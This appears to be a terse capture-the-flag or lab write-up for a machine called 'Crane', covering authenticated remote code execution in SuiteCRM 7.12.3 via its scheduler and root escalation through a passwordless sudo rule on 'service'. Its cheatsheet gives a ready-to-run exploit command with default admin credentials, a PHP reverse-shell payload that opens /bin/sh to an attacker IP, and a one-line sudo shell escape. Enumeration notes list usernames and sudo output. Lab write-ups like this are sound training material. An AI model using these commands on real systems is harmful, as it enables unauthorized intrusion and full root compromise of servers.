# Crane \[Inter]

## Report

SuiteCRM version 7.12.3 is vulnerable to authenticated RCE via scheduler including PHP files. user 'www-data' can run 'service' as sudo and spawn a new shell as root.

## Cheatsheet

```
python3 exploit.py -h http://192.168.167.146 -u 'admin' -p 'admin' --payload "php -r '\$sock=fsockopen(\"192.168.45.234\", 8000); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
sudo service ../../bin/sh
```

## Loot

### Enumeration

192.168.167.146

#### 3306

MySQL not accepting connections from our IP (unauthorized tho)

No connections from www-data within localhost either

#### 80

SuiteCRM Version 7.12.3

Sugar Version 6.5.25 (Build 344)

{% code title="userlist" %}
```
admin
chris
jim
tom
sally
sarah
will
```
{% endcode %}

{% code title="robots.txt" %}
```
User-agent: *
Disallow: /

User-agent: Googlebot
Allow: /ical_server.php
```
{% endcode %}

### Attack Vectors

Yeah about that

### PrivEsc

```
User www-data may run the following commands on localhost:
(ALL) NOPASSWD: /usr/sbin/service

Cronjob via linpeas.sh
cd /var/www/html; php -f cron.php > /dev/null 2>&1

Interesting file
/usr/bin/gettext.sh
```

### Creds

None

### Proof

None
